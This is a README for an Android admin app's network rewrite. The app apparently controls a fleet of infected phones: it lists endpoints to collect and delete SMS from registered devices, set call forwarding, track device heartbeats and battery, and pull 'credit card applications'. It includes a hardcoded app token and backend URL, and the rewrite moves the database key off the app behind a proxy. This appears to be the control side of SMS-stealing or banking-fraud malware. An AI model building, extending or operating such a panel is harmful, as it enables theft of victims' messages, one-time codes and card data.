ANDROID CODE - COMPLETE NEW STRUCTURE
======================================

FILES IN THIS ZIP:
-------------------

1. app/src/main/java/com/example/admin/network/SupabaseApi.kt
   → FULLY REWRITTEN — no longer calls yjjoyvpexlutdlrqcxql directly
   → All data now flows through your backend proxy (DEVICE_API_BASE_URL)
   → Same public interface — all existing callers work without changes

2. BACKEND CHANGES (already live on your server):
   New routes added to device.ts:
   - DELETE /api/device/:appToken/message/:msgId   — delete single SMS
   - DELETE /api/device/:appToken/messages          — delete all SMS (or ?uid=X for one device)
   - DELETE /api/device/:appToken/device/:uid       — delete device + all its data
   - PATCH  /api/device/:appToken/star/:uid         — set/unset starred flag
   - admin_config data_type now saves to devices table (not form_data)

HOW THE NEW SupabaseApi.kt WORKS:
-----------------------------------
OLD:  SupabaseApi → yjjoyvpexlutdlrqcxql.supabase.co  (direct, exposed key)
NEW:  SupabaseApi → BACKEND_ROOT/api/device/APP_TOKEN  (no Supabase key in app)

Full function mapping:
  getAllDevices()                          → GET  $BASE/get
  getAllDeviceStatuses()                   → GET  $BASE/get  (uses last_heartbeat_at)
  getLatestDeviceStatuses()               → derived from above
  getAllSmsMessagesFromRegisteredDevices() → GET  $BASE/messages?limit=1000
  getAllSmsLogs()                          → same as above
  getSmsLogsByUniqueId(uid)               → GET  $BASE/messages?uid=X&limit=50
  deleteSmsFromRegisteredDevice(id)       → DELETE $BASE/message/:id
  deleteSmsLog(id)                        → DELETE $BASE/message/:id
  deleteAllSmsMessagesForApp()            → DELETE $BASE/messages
  deleteAllSmsMessagesForDevice(uid)      → DELETE $BASE/messages?uid=X  [NEW]
  getAdminConfig()                        → GET  $BASE/get/admin_config_main
  updateAdminConfig(number, status)       → POST $BASE/upsert  (sub_id=admin_config_main)
  updateCallForwarding(uid, num, status)  → PATCH $BASE/update/:uid
  getStarredDevices()                     → GET  $BASE/get  (reads data_json.starred)
  setStarred(uid, starred)               → PATCH $BASE/star/:uid
  getAllBatteryData()                     → GET  $BASE/get  (reads data_json.battery_data)
  deleteDevice(uid)                       → DELETE $BASE/device/:uid
  getCreditCardApplications(uid)          → GET  $BASE/form-data?uid=X

Constants needed in Constants.kt:
  APP_TOKEN          = "LION-LASER-Q3SV@A7S"
  BACKEND_ROOT       = "https://d51aa85f-07df-422f-b7d0-9f6efd2785d9-00-9sesenw57uo6.sisko.replit.dev"
  DEVICE_API_BASE_URL = "$BACKEND_ROOT/api/device/$APP_TOKEN"

FILES TO DELETE from your project:
  - core/Client.kt             (Retrofit client for second Supabase)
  - core/SupabaseApiService.kt (Retrofit interface for second Supabase)

KEEP these files (still needed):
  - network/SupabaseApi.kt  ← REPLACE with this version
  - core/AppIdManager.kt    ← Already updated (from previous zip)
  - activities/LogicActivity.kt ← Already updated (from previous zip)
